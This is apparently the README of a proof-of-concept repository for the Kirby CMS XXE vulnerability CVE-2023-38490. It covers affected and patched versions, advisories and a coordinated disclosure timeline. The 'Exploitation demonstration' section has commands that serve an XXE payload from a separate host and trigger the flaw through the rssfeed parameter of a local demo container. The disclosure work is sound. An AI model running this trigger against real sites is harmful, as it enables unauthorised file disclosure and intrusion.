# Kirby XML External Entity (XXE) - CVE-2023-38490 exploit

> Kirby < 3.9.6 XML External Entity

Exploit for [CVE-2023-38490](https://nvd.nist.gov/vuln/detail/CVE-2023-38490) / [GHSA-q386-w6fg-gmgp](https://github.com/getkirby/kirby/security/advisories/GHSA-q386-w6fg-gmgp).

## Exploitation demonstration

Build and run the vulnerable demo app:

```bash
cd docker
docker buildx build -t kirby-starterkit-3.9.5 .
docker run -d --rm -p 127.0.0.2:1337:80/tcp --name CVE-2023-38490 kirby-starterkit-3.9.5:latest
```

Serve the demo payload:

Note: choose a bind address that the docker container can access.

```bash
popd
ruby -run -e httpd ./payload -p 9999 -b 192.168.0.225
```

Trigger the exploit:

```bash
xdg-open http://127.0.0.2:1337/rssfeed?feed=http://192.168.0.225:9999/xxe.rss
```

## How, and why does it work?

The vulnerable function is present in Kirby Core but is not used by default in Kirby Core, Kirby StarterKit, or Kirby PlainKit. It means the vulnerability won't affect you on default configuration but could be introduced with custom development or by installing a plugin using the impacted toolkit.

For more details, read the dedicated article ([EN 🇬🇧](https://www.acceis.fr/kirby-3-9-6-xml-external-entity-xxe-vulnerability-cve-2023-38490) or [FR 🇫🇷](https://www.acceis.fr/vulnerabilite-kirby-3-9-6-xml-external-entity-xxe-cve-2023-38490)).

## References

- Target software: Kirby
  - Homepage / Vendor: https://getkirby.com/
  - Source code:
    - Core: https://github.com/getkirby/kirby
    - StarterKit (sample site): https://github.com/getkirby/starterkit
    - PlainKit (minimal setup): https://github.com/getkirby/plainkit
  - Vulnerable versions:
    - <= 3.5.8.2
    - 3.6.0-3.6.6.2
    - 3.7.0-3.7.5.1
    - 3.8.0-3.8.4
    - 3.9.0-3.9.5
  - Patched versions:
    - 3.5.8.3+
    - 3.6.6.3+
    - 3.7.5.2+
    - 3.8.4.1+
    - 3.9.6+
  - Patches:
    - 3.5-3.7: [4b2c454](https://github.com/getkirby/kirby/commit/4b2c454039c27e87e7dbda4a52afdbc012e57efd)
    - 3.8-3.9: [277b056](https://github.com/getkirby/kirby/commit/277b05662d2b67386f0a0f18323cf68b30e86387)
  - Advisories:
    - [Github](https://github.com/getkirby/kirby/security/advisories/GHSA-q386-w6fg-gmgp)
    - [OpenCVE](https://www.opencve.io/cve/CVE-2023-38490)
    - [AttackerKB](https://attackerkb.com/topics/NCH1phjOzC/cve-2023-38490)

## Timeline

- Week 24 - Mon, 12 Jun 2023: Vulnerability discovered by Alexandre ZANNI ([@noraj](https://pwn.by/noraj/)), Penetration Testing Engineer at [ACCEIS](https://www.acceis.fr/).
- Week 24 - Tue, 13 Jun 2023: Vulnerability reported to the editor (Kirby) by Alexandre ZANNI
- Week 24 - Wed, 14 Jun 2023: Proof of Concept shared with the editor (Kirby) from Alexandre ZANNI
- Week 24 - Wed, 14 Jun 2023: RFC 9116 [security.txt](https://getkirby.com/security.txt) added to getkirby.com
- Week 24 - Thu, 15 Jun 2023: Vulnerability confirmed by the editor (Kirby)
- Week 24 - Thu, 15 Jun 2023: Release fixes and patches planned
- Week 26 - Thu, 29 Jun 2023: Vulnerability independently discovered by Patrick FALB ([@dapatrese](https://github.com/dapatrese)) at [FORMER 03](https://former03.de/).
- Week 28 - Sun, 16 Jul 2023: Creation of a private GitHub advisory
- Week 29 - Sun, 23 Jul 2023: CVE ID requested
- Week 29 - Sun, 23 Jul 2023: Vulnerability patched by the editor (Kirby)
- Week 30 - Mon, 24 Jul 2023: Alexandre ZANNI invited to the private advisory by the editor (Kirby)
- Week 30 - Mon, 24 Jul 2023: Preparation of a vulnerable demo docker container by Alexandre ZANNI
- Week 30 - Mon, 24 Jul 2023: CVE ID CVE-2023-38490 registered (reserved) 
- Week 30 - Thu, 27 Jul 2023: Public release of the Github advisory and patches

## Disclaimer

ACCEIS does not promote or encourage any illegal activity, all content provided by this repository is meant for research, educational, and threat detection purpose only.
